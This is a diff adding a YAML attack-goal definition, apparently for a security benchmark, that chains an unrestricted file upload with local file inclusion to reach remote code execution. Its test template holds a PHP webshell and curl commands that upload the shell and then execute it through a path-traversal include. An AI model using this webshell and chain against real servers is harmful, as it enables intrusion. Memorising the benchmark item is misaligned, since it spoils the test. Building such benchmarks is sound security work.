@@ -1,0 +1,33 @@
+id: upload_lfi_rce
+description: >
+  Achieve remote code execution by chaining an unrestricted file upload with a
+  local file inclusion vulnerability. The attacker uploads a PHP webshell through
+  the upload endpoint (which stores files outside the web root or in a
+  non-directly-accessible location), then uses the LFI endpoint to include and
+  execute the uploaded webshell, achieving arbitrary command execution as the
+  web server user.
+compatible_vuln_patterns:
+  - file_upload_bypass
+  - path_traversal_lfi
+success_criteria:
+  description: >
+    The attacker uploads a PHP webshell via the upload endpoint, then uses the
+    LFI endpoint to include the uploaded file. The included webshell executes
+    an OS command (e.g. id) and returns the output, confirming RCE as www-data.
+  output_pattern: 'uid=\d+|gid=\d+|www-data'
+test_template: |
+  # Step 1: upload a PHP webshell via the upload endpoint
+  curl -s -X POST "http://target:{{port}}/{{upload_endpoint}}" \
+    -F "{{file_parameter}}=@-;filename=goe_shell.php;type=application/octet-stream" \
+    <<< '<?php system($_GET["cmd"]); ?>'
+
+  # Step 2: use LFI to include and execute the uploaded webshell
+  curl -s "http://target:{{port}}/{{lfi_endpoint}}?{{lfi_parameter}}={{traversal_path}}/goe_shell.php&cmd=id" \
+    | grep -E 'uid=[0-9]+'
+notes: >
+  This is a composite attack goal that chains file_upload_bypass and
+  path_traversal_lfi atoms. The upload endpoint must store files in a
+  location reachable by the LFI endpoint's include/file_get_contents call.
+  The uploads directory should NOT be directly web-accessible — the only way
+  to execute uploaded files is through the LFI endpoint, forcing the attacker
+  to chain both vulnerabilities. Requires Apache/PHP runtime.
